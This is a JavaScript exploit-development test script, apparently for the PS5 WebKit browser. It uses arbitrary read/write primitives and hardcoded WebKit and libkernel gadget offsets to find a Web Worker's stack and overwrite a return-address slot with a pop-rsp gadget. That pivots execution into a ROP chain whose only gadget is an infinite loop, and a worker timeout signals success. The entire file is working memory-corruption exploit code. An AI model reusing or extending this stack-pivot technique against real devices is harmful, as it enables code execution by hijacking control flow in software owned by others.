// worker_entry_1340.js — entry-only test. Chain = [infloop] (no other gadgets).
// TIMEOUT (worker stops answering) = pop-rsp entry WORKS. ANSWER = entry missed.
(async () => {
  const say = async (s) => { try { await log("[wentry] " + s); } catch(e){} };
  const hx = (v) => { try { return "0x" + (BigInt(v) & 0xFFFFFFFFFFFFFFFFn).toString(16); } catch(e){ return "?"; } };
  const WK = BigInt(PS5.webkitBase||0), LK = BigInt(PS5.libkernelBase||0);
  const POPRSP = WK+0xA1138n, INFLOOP = WK+0x1553Dn;
  let worker = null;
  try{
    worker = new Worker("payloads/worker_slave.js");
    await Promise.race([new Promise((res)=>{worker.onmessage=()=>res(1);worker.postMessage(0);}),
      new Promise((_,rej)=>setTimeout(()=>rej(new Error("t/o")),5000))]);
  }catch(e){ await say("ABORT handshake"); return; }
  let wstack = 0n;
  for(const h of [0x64218,0x6C218]){
    try{ let t=read64(LK+BigInt(h));
      for(let i=0;i<64&&t!==0n;i++){ if(read64(t+0xB0n)===0x80000n){ wstack=read64(t+0xA8n); break; } t=read64(t+0x38n); }
    }catch(e){}
    if(wstack) break;
  }
  const EXP = LK+0x1FD01n;
  let retslot = 0n, cnt = 0;
  try{ for(let o=0x7F000n;o<0x80000n;o+=8n){ if(read64(wstack+o)===EXP){ cnt++; if(!retslot) retslot=wstack+o; } } }catch(e){}
  if(cnt!==1){ await say("ABORT retfp="+cnt); return; }
  const cbase = malloc(0x1000), entry = cbase+0x100n;
  write64(entry, INFLOOP);
  const orig_ret = read64(retslot), orig_sp = read64(retslot+8n);
  const spinrange = (orig_sp>=wstack && orig_sp<wstack+0x80000n) ? "in-stack" : "OUT-OF-STACK";
  await say("fire entry="+hx(entry)+" retslot="+hx(retslot)+" orig_sp="+hx(orig_sp)+" "+spinrange);
  write64(retslot, WK+0xA1138n);
  write64(retslot+8n, entry);
  let ans = "none";
  worker.onmessage = () => { ans = "ANSWER"; };
  worker.postMessage(0);
  await new Promise((r)=>setTimeout(r,800));
  if(ans==="none") ans = "TIMEOUT";
  const verdict = ans==="TIMEOUT" ? "ENTRY WORKS (spins)" : "ENTRY MISSED (worker replied)";
  await say("worker "+ans+" => "+verdict);
  try{ write64(retslot, orig_ret); write64(retslot+8n, orig_sp); }catch(e){}
  try{ send_notification("wentry done"); }catch(e){}
})();
